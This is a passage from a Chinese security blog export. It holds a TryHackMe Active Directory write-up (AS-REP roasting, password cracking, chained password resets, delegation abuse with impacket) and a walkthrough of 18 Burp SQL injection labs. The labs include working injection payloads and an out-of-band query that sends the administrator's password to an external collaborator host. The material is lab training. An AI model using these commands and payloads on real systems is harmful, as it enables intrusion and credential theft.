CYRUS_WHITEHEADDANIEL_CHRISTENSEN DARLA_WINTERS DEANNE_WASHINGTONELLIOT_CHARLES ERNESTO_SILVA FANNY_ALLISONGuest HORACE_BOYLE HOWARD_PAGEJULIANNE_HOWE krbtgt LEANN_LONGLETHA_MAYO LILY_ONEILL LINDSAY_SCHULTZMARCELINO_BALLARD MARION_CLAY MICHEL_ROBINSONMITCHELL_SHAW MORGAN_SELLERS RAQUEL_BENSONRICO_PEARSON ROSLYN_MATHIS SHAWNA_BRAYSTEWART_SANTANA TABATHA_BRITT TED_JACOBSONTRACY_CARVER TREVOR_MELTONThe command completed with one or more errors. 然后再查询一下域控的主机名 1234567891011*Evil-WinRM* PS C:\\Users\\automate\\Desktop&gt; net group &quot;Domain Controllers&quot; /domainGroup name Domain ControllersComment All domain controllers in the domainMembers-------------------------------------------------------------------------------Guest HAYSTACK$ HOWARD_PAGEMORGAN_SELLERSThe command completed successfully. 然后查看一下域管的名字 1net group &quot;domain admins&quot; /domain 可以知道域管的名字为Administrator 由一开始查域内用户可知，我们现在就是要提权到Administrator域管用户，然后再横向移动到域控 现在我们利用一下Bloodhound进行一下域内的信息收集 1bloodhound-python -ns 10.10.188.230 --dns-tcp -d THM.CORP -u &#x27;automate&#x27; -p &#x27;Passw0rd1&#x27; -c All --zip 然后将生成的zip文件导入bloodhound图形化界面中（安装教程参考 ），查看信息 12sudo neo4j start./BloodHound --no-sandbox 横向移动我们从上面的分析中看到，检查 AS-REP Roastable 用户，有 3 个用户。这表示以下三个用户支持 AS-REP 。 ERNESTO_SILVA@THM.CORP TABATHA_BRITT@THM.CORP LEANN_LONG@THM.CORP AS-REP Roasting接下来我们就利用这几个用户，使用AS-REP Roasting攻击。 AS-REP Roasting攻击利用了Kerberos协议中的弱点，其中AS-REP请求是一种允许用户使用预身份的请求，而不需要提供密码。攻击者可以通过发送特制的AS-REP请求，从域控制器获取目标用户的加密AS-REP票据。这个攻击的利用前提为： 需要用户账号设置 “Do not require Kerberos preauthentication(不需要kerberos预身份验证) “。但是该属性是默认不勾选的。 我们使用impacket的GetNPUsers.py脚本来分别请求这三个用户的TGT票据，记得要把ip写上噢 123impacket-GetNPUsers thm.corp/ERNESTO_SILVA -request -no-pass -dc-ip 10.10.234.211impacket-GetNPUsers thm.corp/TABATHA_BRITT -request -no-pass -dc-ip 10.10.234.211impacket-GetNPUsers thm.corp/LEANN_LONG -request -no-pass -dc-ip 10.10.234.211 接下来分别用john （我用hashcat没有爆出来）对这三个结果进行爆破 123john 1.txt --wordlist=/usr/share/wordlists/rockyou.txt john 2.txt --wordlist=/usr/share/wordlists/rockyou.txt john 3.txt --wordlist=/usr/share/wordlists/rockyou.txt 只有第二个TABATHA_BRITT用户爆破出了密码，为marlboro(1985)可以用 john --show 2.txt 显示密码 这里后面我再试了一下，hashcat也可以进行爆破如果$krb5asrep后面没有$23的话，要在$krb5asrep后面添加$23拼接。才能变成hashcat可以识别的格式 1hashcat -m 18200 2.txt /usr/share/wordlists/rockyou.txt --force 然后我们争对TABATHA_BRITT用户再进行枚举 1bloodhound-python -ns 10.10.20.164 --dns-tcp -d THM.CORP -u &#x27;TABATHA_BRITT&#x27; -p &#x27;marlboro(1985)&#x27; -c All --zip 可以看到这里我们想到达 DARLA_WINTERS 的路线就是从TABATHA_BRITT到 SHAWMA_BRAY 的 GenericAll。然后将密码从 SHAWMA_BRAY 强制更改为 CRUZZ_HALL。最后从 CRUZ_HALL 到 DARLA_WINTERS 的通用写入。这里为什么我们要选择这条路线呢？我们可以看到这条路线最后的WINTERS用户可以到达DOMAIN COMPUTERS域控机器，聪明BRITT出发就只有这一条路线到域控 我们右键路线，选择help然后可以看到这里我们可以看到可以通过RPC使用GenericAll更改用户的密码。这也适用于 ForceChangePassword 和 GenericWrite。由于 TABATHA_BRITT 具有 SHAWNA_BRAY 的 GenericAll，因此我们可以使用它来重置 SHAWNA_BRAY 的密码。使用net rpc来实现这一点。 12345net rpc password &quot;SHAWNA_BRAY&quot; &quot;newPassword@2024&quot; -U &quot;thm.corp&quot;/&quot;TABATHA_BRITT&quot;%&quot;marlboro(1985)&quot; -S &quot;10.10.49.98&quot;net rpc password &quot;CRUZ_HALL&quot; &quot;newPassword@2024&quot; -U &quot;THM.CORP&quot;/&quot;SHAWNA_BRAY&quot;%&quot;newPassword@2024&quot; -S &quot;10.10.49.98&quot;net rpc password &quot;DARLA_WINTERS&quot; &quot;newPassword@2024&quot; -U &quot;THM.CORP&quot;/&quot;CRUZ_HALL&quot;%&quot;newPassword@2024&quot; -S &quot;10.10.49.98&quot; 来验证一下密码修改成功了没 1crackmapexec smb 10.10.49.98 -u DARLA_WINTERS -p &#x27;newPassword@2024&#x27; 然后我们再对DARLA_WINTERS用户进行一下枚举 1bloodhound-python -ns 10.10.20.164 --dns-tcp -d THM.CORP -u &#x27;DARLA_WINTERS&#x27; -p &#x27;newPassword@2024&#x27; -c All --zip 我们看到DARLA_WINTERS用户，可以通过CIFS服务进行委派攻击 委派攻击Impacket 的getST脚本将请求服务的Ticket 并将其保存为 ccache。如果帐户具有受限的委派权限，可以使用 -impersonate 标志代表其他用户请求票证。在请求票据之前，我们先输入下面这个命令。这个命令可以从指定的 NTP 服务器上获取准确的时间，并将系统时间调整到与之同步。 1ntpdate -s thm.corp 然后再开始获取票据，这里我试了好多次好多命令都没成功，最终执行下面这个命令成功了，我的感觉就是命令要尽量写的完整，ip和域名和用户名密码都尽量写上。 1impacket-getST -spn &quot;cifs/haystack.thm.corp&quot; -dc-ip 10.10.20.164 -impersonate &quot;Administrator&quot; &quot;thm.corp/DARLA_WINTERS:newPassword@2024&quot; 12export KRB5CCNAME=Administrator.ccacheimpacket-wmiexec -k -no-pass Administrator@HayStack.thm.corp 但是我这里在输入第二个命令的时候一直报错提示找不到服务，这是由于没有解析我们的域名导致的我们需要编辑下我们的hosts文件，文件位于/etc/hosts。我们在文件的任意位置加上 1靶机IP HayStack.thm.corp 然后再次尝试然后寻找第二个flag为THM&#123;RE_RE_RE_SET_AND_DELEGATE&#125; 我们可以画一个这个靶场的总思路思维导图 参考文章https://jaxafed.github.io/posts/tryhackme-reset/#access-as-tabatha_britthttps://0xb0b.gitbook.io/writeups/tryhackme/2024/reset#initial-access","categories":[{"name":"渗透","slug":"渗透","permalink":"https://qingwan.top/categories/%E6%B8%97%E9%80%8F/"}],"tags":[],"author":"Qingwan"},{"title":"Burpsuite--SQL注入相关实验","slug":"BURP-SQL注入","date":"2024-01-28T10:11:26.343Z","updated":"2024-01-28T10:28:09.975Z","comments":true,"path":"2024/01/28/BURP-SQL注入/","link":"","permalink":"https://qingwan.top/2024/01/28/BURP-SQL%E6%B3%A8%E5%85%A5/","excerpt":"本文讲了Burpsuite实验室中和SQL注入有关的18个实验的思路以及SQL注入的防御方法","text":"本文讲了Burpsuite实验室中和SQL注入有关的18个实验的思路以及SQL注入的防御方法 实验Lab1：检索隐藏数据当检索参数category时，后台查询语句为： 1SELECT * FROM products WHERE category = &#x27;Gifts&#x27; AND released = 1 随便打开一个类别，看到地址栏的参数，猜测为注入点，如果参数为空，则默认为Gifts那我们这里的目的就是要进行查询，使其显示所有种类的商品，这里面就包括我们隐藏的商品。后台查询语句中的 released = 1就是隐藏未发布商品的意思，我们需要给这里的参数赋值，使得整个语句为真，进而显示出所有商品。根据后台查询语句，进行测试 1231&#x27;1&#x27; --1&#x27; or 1=1 -- or后面的条件 1=1 恒为真，所以无论前面是什么，是否存在，最后都恒为true，都返回全部商品那为什么 1&#39; and 1=1 -- 不行呢，因为这里的1不存在，所以返回为空，如果是Lifestyle&#39; and 1=1 --，则会返回所有Lifestyle种类的商品可以理解为and 1=1，始终为真，所以返回会返回and前面查询的结果 Lab2：干扰应用程序逻辑一开始提示需要用administrator账户进行登录，打开实验发现是个登录框，需要我们输入用户名和密码这里存在administrator这个账户，但是我们不知道密码题目提示我们后台的查询语句是这样的 1SELECT * FROM users WHERE username = &#x27;wiener&#x27; AND password = &#x27;bluecheese&#x27; 那当我们输入的用户名加了注释符之后，把后面的密码部分给注释了，这时我们就不输入密码也可以登录了 1administrator&#x27;-- Lab3：查询Oracle数据库中的信息union select联合查询&amp;v$version 提示：在 Oracle 数据库上，每个 SELECT 语句都必须指定要选择 FROM 的表（必须是存在的）。如果您的 UNION SELECT 攻击不从表中查询，您仍然需要包含 FROM 关键字，后跟有效的表名称。 Oracle 上有一个名为 Dual 的内置表，您可以使用它来实现此目的。例如： UNION SELECT &#39;abc&#39; FROM Dual 我们可以看到是Oracle数据库进行测试： 12&#x27; order by 2--+&#x27; order by 3--+ //报错，证明有两列 然后进行查询，union联合查询要求列数要相同，那这里对于多出来的，我们不需要为什么要用NULL值呢，因为NULL值可以与任何数据类型兼容，可以转换为任何数据类型，所以就可以用来判断列数。这里我们需要查找Oracle数据库的类型很版本信息。在Oracle数据库中，v$version视图是一个系统视图，它包含了数据库的版本信息。v$version视图只有一列，即BANNER列。BANNER列包含了数据库版本的说明信息，通常会显示数据库的版本号、数据库名称以及其他相关信息。最终payload： 1?category=&#x27; UNION SELECT BANNER, NULL FROM v$version-- 扩展（各数据库查询版本语句）： Oracle SELECT banner FROM v$version SELECT version FROM v$instance Microsoft SELECT @@version PostgreSQL SELECT version() MySQL SELECT @@version Lab4：查询 MySQL 和 Microsoft数据库中的信息按照上面的拓展，输入paylaod 1?category=&#x27; UNION SELECT @@version, NULL --+ Lab5：列出非 Oracle 数据库的数据库内容这一个实验是要检索出所有用户的用户名和密码，然后找到administrator用户的密码然后登录用于列出数据库中存在的表以及表中的值 Oracle SELECT * FROM all_tables SELECT * FROM all_tab_columns WHERE table_name = &#39;TABLE-NAME-HERE&#39; Microsoft SELECT * FROM information_schema.tables &#96;&#96; SELECT * FROM information_schema.columns WHERE table_name &#x3D; ‘TABLE-NAME-HERE’ &#96; PostgreSQL SELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39; MySQL SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39; 测试 12345678&#x27; order by 2--&#x27; order by 3-- //报错，一共有两列#查所有表（自带的information_schema）&#x27; UNION SELECT table_name, NULL FROM information_schema.tables--#查询user表中的字段&#x27; UNION+SELECT column_name,NULL FROM information_schema.columns WHERE table_name=&#x27;users_ijzvku&#x27;--#查询字段对应数据&#x27; UNION SELECT username_dvpxsd,password_ikfgbg FROM users_ijzvku-- 然后登录 Lab6：检索 Oracle 数据库的数据库内容这个实验的要求和上面的实验一样，只是这次是在Oracle数据库中查询数据库信息 1&#x27; UNION SELECT BANNER, NULL FROM v$version-- 发现为Oracle数据库查询所有表 1&#x27; UNION SELECT table_name,NULL FROM all_tables-- 查询user表中的字段 1&#x27; UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name=&#x27;USERS_ZZCVKH&#x27;-- 查询字段的值 1&#x27; UNION SELECT PASSWORD_HTRFEY,USERNAME_QTIRLI FROM USERS_ZZCVKH--+ 查询到密码jtc61on6lx0544pmyxhu，然后登录 Labs7：确定查询返回的列数确定所需的列数官方介绍了两种方法第一种是通过 order by 查询 123&#x27; order by 2--&#x27; order by 3--&#x27; order by 4-- 第二种是通过union联合查询 123&#x27; UNION SELECT NULL,NULL --&#x27; UNION SELECT NULL,NULL ,NULL --&#x27; UNION SELECT NULL,NULL,NULL,NULL -- 利用所得到的列数来查询一下数据库版本信息 123456&#x27; union select banner,null,null from v$version-- #报错&#x27; UNION SELECT @@version, NULL,NULL --+ #报错&#x27; UNION SELECT version(), NULL,NULL -- #报错#换一个回显位&#x27; UNION SELECT NULL, version(), NULL -- #为PostgreSQL数据库 Labs8：查找到包含对应文本的列查找具有有用数据类型的列要求要我们检索到字符串wYabaS 12&#x27; order by 3--+&#x27; order by 4--+ #报错 列数有3列，然后开始查找拿个字段中存在对应的字符串，探测每一列以测试它是否可以容纳字符串数据。您可以提交一系列UNION SELECT有效负载，将字符串值依次放入每列中。这里有3列，所以我们最多要输入3次 123&#x27; UNION SELECT &#x27;wYabaS&#x27;,NULL ,NULL --&#x27; UNION SELECT NULL,&#x27;wYabaS&#x27; ,NULL -- #查询到对应字段&#x27; UNION SELECT NULL,NULL ,&#x27;wYabaS&#x27;-- Labs9：从其他表中检索数据从users表中检索到username和password，然后登录administrator用户 使用 SQL 注入 UNION 攻击检索感兴趣的数据123&#x27; order by 2--&#x27; order by 3--&#x27; UNION SELECT username, password FROM users-- Labs10：检索单个列中的多个值在某些情况下，上一个实验中的查询可能仅返回单个列。可以通过将值连接在一起来检索该单列中的多个值，可以包含分隔符来区分组合值。这里的要求和上面一样，但是我们这次要用连接符和分隔符进行操作。双管道序列||，它是 Oracle 上的字符串连接运算符。这里的分隔符就用~连接符拓展 Oracle &#39;foo&#39;|&#39;bar&#39; Microsoft &#39;foo&#39;+&#39;bar&#39; PostgreSQL &#39;foo&#39;|&#39;bar&#39; MySQL &#39;foo&#39; &#39;bar&#39; [Note the space between the two strings] CONCAT(&#39;foo&#39;,&#39;bar&#39;) 123&#x27; order by 2--&#x27; order by 3--&#x27; UNION SELECT NULL,username|| &#x27;~&#x27; || password FROM users-- Labs11：基于条件回显注入的盲注条件和上个实验一样，但是不同的是没有了回显，是盲注，题目提示注入点为cookie cookie盲注cookie 标头：Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4TrackingId当处理 包含 cookie 的请求时，应用程序使用 SQL 查询来确定这是否是已知用户： 1SELECT TrackingId FROM TrackedUsers WHERE TrackingId = &#x27;u5YD3PapBcR4lN3e7Tj4&#x27; 我们可以利用这里进行SQL注入，但是没有回显，不过还是可以一些特点进行判断如果查询是正确的，页面会回显：”Welcome back”比如：传参给cookie的TrackingId 12&#x27; and 1=1-- #返回&#x27; and 1=2-- #不返回 即我们就可以根据回显，判断我们后面的条件是否正确，抓包进行测试 123456789101112131415161718#判断是否存在user表，使用 SELECT &#x27;a&#x27; 是为了创建一个固定的查询结果，即字符串常量 &#x27;a&#x27;。而将条件 (SELECT &#x27;a&#x27; FROM users LIMIT 1)=&#x27;a&#x27; 用于比较查询结果是否等于 &#x27;a&#x27;，如果条件成立（即返回值不为空，即存在user表）则返回为a，比较成功，返回为真&#x27; AND (SELECT &#x27;a&#x27; FROM users LIMIT 1)=&#x27;a&#x27;-- #返回，含有user表#判断是否存在administrator用户&#x27; AND (SELECT &#x27;a&#x27; FROM users WHERE username=&#x27;administrator&#x27;)=&#x27;a&#x27;-- #返回，存在#判断密码位数，这里也可以用爆破&#x27; and (SELECT &#x27;a&#x27; FROM users WHERE username=&#x27;administrator&#x27; AND LENGTH(password)&gt;2)=&#x27;a&#x27; and (SELECT &#x27;a&#x27; FROM users WHERE username=&#x27;administrator&#x27; AND LENGTH(password)&gt;3)=&#x27;a&#x27; and (SELECT &#x27;a&#x27; FROM users WHERE username=&#x27;administrator&#x27; AND LENGTH(password)&gt;4)=&#x27;a......#直到20时，无回显，代表密码是20位&#x27; and (SELECT &#x27;a&#x27; FROM users WHERE username=&#x27;administrator&#x27; AND LENGTH(password)&gt;20)=&#x27;a&#x27;--#判断密码每一位，爆破每一位的值&#x27; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username=&#x27;administrator&#x27;)=&#x27;a&#x27;-- payload1： payload2： 然后按顺序排列在一起muyu73xbiyxzrfbw88pd，用密码登录 Labs12：基于条件报错注入的盲注这题和上面不同的是，无论查询是否有结果都不会有不一样的回显。但是如果查询错误，会根据相应的错误报错。这题也是cookie头注入，burp示例里的报错方法，我之前都没有看到过，因为之前用的都是mysql的报错注入。官方的示例是这样的： 12xyz&#x27; AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE &#x27;a&#x27; END)=&#x27;a xyz&#x27; AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE &#x27;a&#x27; END)=&#x27;a 这些输入使用CASE关键字来测试条件并根据表达式是否为真返回不同的表达式： 对于第一个输入，CASE表达式的计算结果为&#39;a&#39;，这不会导致任何错误。 对于第二个输入，其计算结果为1/0，这会导致被零除错误。 然后我们通过是否报错来判断我们的条件是否正确一些其他数据库的条件报错的示例： Oracle SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual Microsoft SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END PostgreSQL 1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END) MySQL SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&#39;a&#39;) 这里我们就抓包，然后进行测试 123456#判断数据库类型&#x27; || (select &#x27;&#x27;) || &#x27; #报错，不为mysql&#x27; || (select &#x27;&#x27; from dual ) || &#x27; #不报错，为oracle#判断是否存在user表&#x27;||(SELECT &#x27;&#x27; FROM users WHERE ROWNUM = 1)||&#x27; #不报错，存在user表 这里如果不加 rownum=1 控制返回只有一行的话就会报错。子查询结果返回为多行或者为NULL时，字符串拼接就会报错，所以我们这里要控制他返回为一行。 123#判断是否存在administrator用户&#x27;||(SELECT &#x27;&#x27; FROM users WHERE username=&#x27;administrator&#x27; and rownum=1)||&#x27; #不报错，存在administrator用户 判断密码的位数，如果密码符合我们的条件，则会执行1&#x2F;0，就会报错，直到不符合条件时，执行else里的内容，正常回显，这里爆破一下，发现为20时正常回显，说明密码不大于20位，则代表密码为20位 1&#x27;||(select case when length(password)&gt;2 then to_char(1/0) else &#x27;&#x27; end from users where username=&#x27;administrator&#x27;) ||&#x27; 这里在 1/0 之前必须要加个 to_char。不然就算超过20应该正常回显的时候也会报错 to_char(1/0) 将除以零的异常转换成了一个字符串 &#39;ORA-01476&#39;（在 Oracle 中除以零的错误码），这样就可以避免直接抛出异常，从而不会导致整个语句报错。 爆破密码，Oracle数据库使用substr函数 1&#x27;||(select case when substr(password,1,1)=&#x27;a&#x27; then to_char(1/0) else &#x27;&#x27; end from users where username=&#x27;administrator&#x27;) ||&#x27; 和上一题一样开启爆破密码为367bgwjiwvsxy3cm6hdl Labs13：基于可见的错误消息提取数据这种类型的题目呢就是返回的报错信息里会含有一些我们需要的数据，所以我们就根据返回的报错来获得数据。 Microsoft 微软 SELECT &#39;foo&#39; WHERE 1 = (SELECT &#39;secret&#39;) &gt; Conversion failed when converting the varchar value &#39;secret&#39; to data type int. PostgreSQL SELECT CAST((SELECT password FROM users LIMIT 1) AS int) &gt; invalid input syntax for integer: &quot;secret&quot; MySQL SELECT &#39;foo&#39; WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT &#39;secret&#39;))) &gt; XPATH syntax error: &#39;\\secret&#39; 测试一下 12&#x27; #报错&quot; #不报错，为单引号闭合 直接给出了后台查询的语句，以及提醒我们单引号没闭合爆出用户名 1&#x27; AND 1=CAST((SELECT username FROM users) AS int)-- 这个语句正常来说会报错，这段sql语句会将一个 AND 逻辑运算符与一个条件表达式组合在一起，条件表达式使用子查询从 users 表中获取用户名，并将其作为整数类型进行转换。但是，由于用户名通常不是整数，因此转换将失败，并导致整个条件表达式的结果为 false。我们看到这里，他虽然报错了，但是报错的原因是在 SQL 查询中存在一个未终止的字符串字面量。这是由于引号没有闭合导致的，但是我们都注释了他怎么会没有闭合呢。我们看到报错信息里显示的语句都没有把我们输入的语句完整显示出来，代表这里我们输入的可能超出了他的限制，所以我们要把前面多余的没有用的语句删了。 但是又显示他的返回不止一行所以报错，我们之前说到在 Oracle 数据库中我们可以通过 rownum=1来限制他的返回行数为1行 1&#x27; AND 1=CAST((SELECT username FROM users) AS int and rownum=1)-- 但是这里字符数超了，而且这里是PostgreSQL，所以我们要用limit 1去限制 1&#x27; AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- 爆出了用户名查密码 1&#x27; AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- 得到密码 tjl9qjggrlpfs7xjysff Labs14：基于时间延迟的盲注通过时间的相应快慢来判断条件是否正确，比如下面就是各种数据库延迟10秒的语句，这个实验的要求就是让我们延迟10秒钟 Oracle dbms_pipe.receive_message((&#39;a&#39;),10) Microsoft WAITFOR DELAY &#39;0:0:10&#39; PostgreSQL SELECT pg_sleep(10) MySQL SELECT SLEEP(10) 然后就依次输入语句进行测试 12&#x27; || SLEEP(10) -- #无延迟&#x27; ||pg_sleep(10) -- #有延迟 Labs15：基于时间延迟的SQL注入要求找到对应用户对应的密码进行登录从敏感信息中获得数据 Oracle SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN &#39;a&#39;|dbms_pipe.receive_message((&#39;a&#39;),10) ELSE NULL END FROM dual Microsoft IF (YOUR-CONDITION-HERE) WAITFOR DELAY &#39;0:0:10&#39; PostgreSQL SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END MySQL SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),&#39;a&#39;) 测试过程，判断数据库类型，有延迟，为PostgreSQL数据库 1&#x27;||pg_sleep(10) -- 或者用下面这个语句也可以判断，分号用于结束上一个select语句，然后来执行下一条语句 1&#x27;;select case when (1=1) then pg_sleep(10) else pg_sleep(0) end -- 但是这里注意，由于分号在URL中具有特殊含义（作为参数的分隔符），所以需要对其进行编码，以确保URL的正确解析。所以url编码一下为： 1&#x27;%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- 判断administrator用户是否存在，有延迟，存在该用户 1&#x27;%3BSELECT+CASE+WHEN+(username=&#x27;administrator&#x27;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- 判断密码长度，密码长度为20位 1&#x27;%3BSELECT+CASE+WHEN+LENGTH(password)&gt;20+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users+WHERE username=&#x27;administrator&#x27;-- 爆破密码，我们爆破的时候可以把延迟时间设置的短一点，不然会很慢，我这里设置的是5s。PostgreSQL中的截取函数用substring() 1&#x27;%3BSELECT+CASE+WHEN+SUBSTRING(password,1,1)=&#x27;a&#x27;+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users+WHERE username=&#x27;administrator&#x27;-- 我们将这个选项勾上，我们通过判断接受相应的计数多少来看他的延迟时间，时间越长他的计数相应的也会越多爆破完成之后，选取计数高的20位开始排序密码为kddfmbo2sbbrbf0jlkjm Labs16：基于外带的SQL注入这里的SQL查询是异步执行的，对应用程序的相应没有影响。所以我们这里就要用到DNS外带技术Burp在Burp Collaborator模块中，有很多DNS域名各个数据库的触发条件 Oracle (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:( (XXE) 漏洞触发 DNS 查找。该漏洞已被修补，但存在许多未修补的 Oracle 安装：)SELECT EXTRACTVALUE(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual The following technique works on fully patched Oracle installations, but requires elevated privileges:(以下技术适用于完全修补的 Oracle 安装，但需要提升的权限：)SELECT UTL_INADDR.get_host_address(&#39;BURP-COLLABORATOR-SUBDOMAIN&#39;) Microsoft exec master..xp_dirtree &#39;//BURP-COLLABORATOR-SUBDOMAIN/a&#39; PostgreSQL copy (SELECT &#39;&#39;) to program &#39;nslookup BURP-COLLABORATOR-SUBDOMAIN&#39; MySQL The following techniques work on Windows only:（只能在windows上执行）LOAD_FILE(&#39;\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a&#39;) SELECT ... INTO OUTFILE &#39;\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&#39; 这个实验要求我们进行一次DNS查找 找到对应模块，copy一个，然后在对应地方进行替换 payload为 1&#x27; UNION SELECT EXTRACTVALUE(xmltype(&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://4mrnjhutgi7w2qvyzwpuapr5ewkn8fw4.oastify.com/&quot;&gt; %remote;]&gt;&#x27;),&#x27;/l&#x27;) FROM dual-- 这个payload里也含有特殊字符如 &lt;, &gt;，所以同理我们也要对他进行编码 1&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http://4mrnjhutgi7w2qvyzwpuapr5ewkn8fw4.oastify.com&quot;&gt;+%25remote%3b]&gt;&#x27;),&#x27;/l&#x27;)+FROM+dual-- Labs17：带外数据渗出的SQL盲注我们需要外带出密码进行登录不同数据库的外带数据方法： Oracle SELECT EXTRACTVALUE(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://&#39;|(SELECT YOUR-QUERY-HERE)|&#39;.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual Microsoft declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&#39;master..xp_dirtree &quot;//&#39;+@p+&#39;.BURP-COLLABORATOR-SUBDOMAIN/a&quot;&#39;) PostgreSQL create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into p (SELECT YOUR-QUERY-HERE); c := &#39;copy (SELECT &#39;&#39;&#39;&#39;) to program &#39;&#39;nslookup &#39;|p|&#39;.BURP-COLLABORATOR-SUBDOMAIN&#39;&#39;&#39;; execute c; END; $$ language plpgsql security definer; SELECT f(); MySQL The following technique works on Windows only: SELECT YOUR-QUERY-HERE INTO OUTFILE &#39;\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&#39; payload为： 1&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//&#x27;||(SELECT+password+FROM+users+WHERE+username%3d&#x27;administrator&#x27;)||&#x27;.0lmjidtpfe6s1muuysoq9lq1dsjj7hv6.oastify.com/&quot;&gt;+%25remote%3b]&gt;&#x27;),&#x27;/l&#x27;)+FROM+dual-- 密码为：6uh5z7ji1etozubhhlzk Labs18：通过XML编码绕过过滤器的SQL注入实验环境有WAF，我们需要通过绕过WAF来查询用户名和密码，成功查询后，查询结果将返回在页面上。打开实验环境，先随便打开一个商品，然后查看他的库存，同时进行抓包 我们看到这里系统将检查库存特性以XML格式发送这里我们试着将这里的id（1）替换成其他的，productId之间的表示的是生产地序号，storeId之间的表示库存量首先我们来查找注入点，在storeId之间分别改为 2和 1+1发现回显相同，都显示库存量为17，这里系统可以识别我们1+1的逻辑，并为进行过滤，很有可能这里就是注入点接下来我们测试一下查询语句 11 UNION SELECT NULL 不允许查询，这里被绕过了 利用Hackvertor进行模糊查询绕过 在注入XML时，尝试使用XML实体混淆负载。一种方法是使用Hackvertor扩展（这个一个非常强大的插件）。只需突出显示您的输入，右键单击，然后选择：Extensions &gt; Hackvertor &gt; Encode &gt; dec_entities&#x2F;hex_entities。 可以直接在 BApp store下载 选择对应的部分，然后在插件里面选择 dec_entities/hex_entities成功回显然后我们就可以用union联合查询去查询密码了 11 UNION SELECT username || &#x27;~&#x27; || password FROM users 密码为n81voangbdsgcbfqe0c8 SQL注入的防御 预编译，也叫做参数化查询，这也是最有效的一种防御方法。预编译相当于是将数据与代码分离的方式，把传入的参数绑定为一个变量，用？表示，攻击者无法改变SQL的结构，无论攻击者传入什么，都当作字符串处理，而不是处理为SQL关系区的一部分。比如下面的语句很容易收到SQL注入攻击 123String query = &quot;SELECT * FROM products WHERE category = &#x27;&quot;+ input + &quot;&#x27;&quot;; Statement statement = connection.createStatement(); ResultSet resultSet = statement.executeQuery(query); 那我们修改下上面的语句变成 123PreparedStatement statement = connection.prepareStatement(&quot;SELECT * FROM products WHERE category = ?&quot;);statement.setString(1, input); ResultSet resultSet = statement.executeQuery(); 使用正则表达式对输入进行过滤 使用最小权限原则，给用户以最小的权限，避免他们执行一些恶意操作","categories":[{"name":"web","slug":"web","permalink":"https://qingwan.top/categories/web/"}],"tags":[],"author":"Qingwan"},{"title":"域渗透横向移动-Ntlm relay中继攻击","slug":"ntlm relay","date":"2024-01-23T14:28:18.389Z","updated":"2024-01-23T14:58:18.283Z","comments":true,"path":"2024/01/23/ntlm relay/","link":"","permalink":"https://qingwan.top/2024/01/23/ntlm%20relay/","excerpt":"Ntlm relay中Net-NTLM hash的获取方法以及relay方法","text":"Ntlm relay中Net-NTLM hash的获取方法以及relay方法 前言ntlm relay攻击其实比较准确点说应该是Net-NTLM relay攻击，也就是ntlm中继攻击。我们先来说一下Ntlm协议的简单的认证流程 ntlm本地认证Windows将用户的密码存储在本地计算机的SAM文件中，文件位置：C:\\Windows\\System32\\config\\SAM。密码的存储以NTLM Hash的方式进行存储。当用户输入密码进行本地认证时，首先系统会将明文密码处理成NTLM Hash，然后与SAM文件中的Hash进行比较，相同则认证通过。同时，会在lsass.exe进程中，保存一份明文密码（window server 2012之前）。 ntlm网络认证NTLM的网络认证，仔细细分可以分为工作组环境下的认证和域环境下的认证。大致原理相同，都是采用Challenge/Response验证机制。在工作组协议下，ntlm协议的认证主要分为以下几步 1）客户端首先会在本地缓存一份用户输入的密码值对应的NTLM 